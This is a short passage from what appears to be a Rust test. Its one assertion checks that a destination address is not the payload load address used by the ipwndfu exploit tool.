        assert_ne!(dest, 0x1800E0C00, "that is ipwndfu's PAYLOAD_DEST");
    }
}
